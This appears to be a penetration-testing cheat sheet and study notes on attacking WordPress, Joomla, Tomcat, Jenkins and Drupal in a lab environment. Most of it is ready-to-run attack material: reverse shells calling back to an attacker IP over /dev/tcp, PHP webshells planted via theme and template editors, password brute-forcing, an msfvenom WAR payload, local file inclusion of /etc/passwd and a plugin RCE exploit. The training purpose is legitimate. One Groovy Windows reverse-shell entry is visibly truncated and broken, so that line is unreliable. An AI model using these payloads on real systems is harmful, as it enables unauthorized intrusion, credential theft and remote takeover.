# Attacking Common Applications

## Cheat Sheet

| Command | Description |
|---------|-------------|
| `sudo vim /etc/hosts` | Opens /etc/hosts with vim to add hostnames |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Runs nmap scan on common web ports from scope_list, outputs to web_discovery in all formats |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>` | Runs eyewitness on nmap XML output, creates directory |
| `cat web_discovery.xml \| ./aquatone -nmap` | Pipes nmap XML to aquatone as nmap input |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate` | Runs wpscan with enumeration on target URL |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Runs wpscan XMLRPC password attack with rockyou wordlist |
| `curl -s http://<hostnameoripoftargetsite>/path/to/webshell.php?cmd=id` | Executes id command via PHP webshell with curl |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'"); ?>` | PHP code for Linux reverse shell |
| `droopescan scan joomla --url http://<domainnameoripaddress>` | Runs droopescan against Joomla site |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>` | Runs joomla-brute.py with specified wordlist and usernames |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` | PHP webshell for Drupal, command via GET parameter |
| `curl -s <http://domainname or IP address of site>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"` | Executes id via Drupal webshell with curl |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | Directory brute force with gobuster and wordlist |
| `auxiliary/scanner/http/tomcat_mgr_login` | Metasploit module for Tomcat manager brute force |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py against Tomcat /manager with default creds lists |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war` | Generates JSP reverse shell WAR payload |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>` | Nmap version scan for Tomcat and AJP ports |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()` | Groovy Linux reverse shell for Jenkins Script Console |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` | Groovy command execution for Windows Jenkins Script Console |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);` | Groovy Windows reverse shell for Jenkins Script Console |
| [`reverse_shell_splunk`](https://github.com/0xjpuff/reverse_shell_splunk) | Splunk package for reverse shells on Windows/Linux |

## Enumeration Tools

- [Eyewitness](https://github.com/RedSiege/EyeWitness)
```bash
sudo apt install eyewitness
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

- [Aquatone](https://github.com/michenriksen/aquatone)
```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
echo $PATH
```
- move to a $PATH location(```/usr/local/bin```) or current working folder
```bash
cat web_discovery.xml | ./aquatone -nmap
```

## Example note layout

External Penetration Test - <Client Name>
- Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- Client Points of Contact
- Credentials
- Discovery/Enumeration
    - Scans
    - Live hosts
- Application Discovery
    - Scans
    - Interesting/Notable Hosts
- Exploitation
    - \<Hostname or IP\>
    - \<Hostname or IP\>
- Post-Exploitation
    - \<Hostname or IP\>
    - \<Hostname or IP\>
- Appendix
    - Exploited systems (hostname/IP and method of exploitation)
    - Compromised users (account name, method of compromise, account type (local or domain))
    - Artifacts created on systems
    - Changes (such as adding a local admin user or modifying group membership)

## Wordpress

### Manual Enumeration

- ```robots.txt``` - can quickly identify if WordPress used
- ```curl -s http://blog.inlanefreight.local | grep WordPress``` - another quick identification method
- ```wp-content/plugins``` - plugins directory
- ```wp-content/themes``` - themes directory
- WordPress user typses on a standard installation
    1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
    2. Editor: An editor can publish and manage posts, including the posts of other users.
    3. Author: They can publish and manage their own posts.
    4. Contributor: These users can write and manage their own posts but cannot publish them.
    5. Subscriber: These are standard users who can browse posts and edit their profiles.
- Manually browse and look at page source
- Grep for wp-content directory, themes and plugin:
```bash
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
```
- Enumerate versions of found plugins
    - Check for ```readme.txt``` in their directories i.e: ```http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt```
    - Check for vulnerabilities of found versions
- Continue enumaration on other pages i.e: ```curl -s http://blog.inlanefreight.local/?p=1 | grep plugins```
- Try some manual enumeration of usernames and/or passwords at the default login page ```http://blog.inlanefreight.local/wp-login.php``` (testing for different error messages; correct user wrong password etc)
- Can use [waybackurls](https://github.com/tomnomnom/waybackurls) to check for old versions of the site
    - Could discover vulnerable plugins that are no longer used but have not been properly removed

### WPScan Enumeration

- [WPVulnDB](https://wpvulndb.com/) to obtain API token
```bash
sudo gem install wpscan
wpscan -h
```
- Default enumeration (plugins, themes, users, media, and backups):
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB\<SNIP\>
```
- Default threads used is 5, change with ```-t``` flag.

### Attacking Wordpress

#### Login bruteforce

- [```/xmlrpc.php```](https://kinsta.com/blog/xmlrpc-php/)
- The ```-U``` flag will also take a file of usernames or a single username
- Same for the ```-P``` flag and passwords
- We can also bruteforce wp-login if xmlrpc isn't available but it is slower
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

#### Code execution

- With access to admin panel
- Go to Appearence side panel, then theme editor
- Select inactive theme to avoid corrupting the main theme (click select)
- Edit an uncommon page such as ```404.php```
- Add below code just below initital comments
```bash
system($_GET[0]);
```
- Click update file to save
- Send commands to the relevant theme page like below:
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

#### Metasploit [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module

```bash
use exploit/unix/webapp/wp_admin_shell_upload 
set username john
set password firebird1
set lhost 10.10.14.15 
set rhost 10.129.42.195  
set VHOST blog.inlanefreight.local
show options 
exploit
```
- Make note of where the shell was uploaded to for later clean up

#### Vulnerable plugin examples 

**mail-masta**
- Local file inclusion
```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**wpDiscuz**

- [WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/49967)
    - ```-u``` URL flag
    - ```-p``` path to a valid post flag    
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
- Once webshell uploaded can enter commands within the script
- If commands fail within the script they can be executed with curl using the the upload location shown in the script output
- Example:
```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

## Joomla

### Discovery

- Grep the page:
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```
- Will possibly be indicated in the ```robots.txt```
- Could be seen in the readme.txt:
```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```
- Joomla sites sometimes have a telltale favicon
- Possibly find the version in use
```bash
curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
- May also find the version number in ```media/system/js/``` or ```administrator/manifests/files/joomla.xml``` (approximate)

### Enumeration

#### Droopscan

- Works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```bash
sudo pip3 install droopescan
droopescan -h
droopescan scan joomla --url http://dev.inlanefreight.local/
```

#### [JoomlaScan](https://github.com/drego85/JoomlaScan)

- Out of date and requires python 2.7
- Not as valuable as droopescan, can help us find accessible directories and files and may help with fingerprinting installed extensions
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

#### Bruteforcing weak admin password

- ```admin``` is the default admin account, password is set at install
- Attempt brute force with [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) script 
```bash
wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py
sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Attacking Joomla

- Search the version online for known vulnerabilities

#### Abusing Built-In Functionality

- Once valid admin credentials obtained, log in to admin dashboard at ```/administrator```
**TIP:** If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin.
- Click on templates under configuration (bottom left)
- Click on a template name under the Templates column header
- Choose a none standard page, ```error.php``` for example.
- Add the web shell after initial comments
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); # randomness added to prevent drive by attack whilst performing pentest
```
- Click ```Save & Close```
- Confirm code execution
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
- Remember to remove webshell after recording the vulnerability
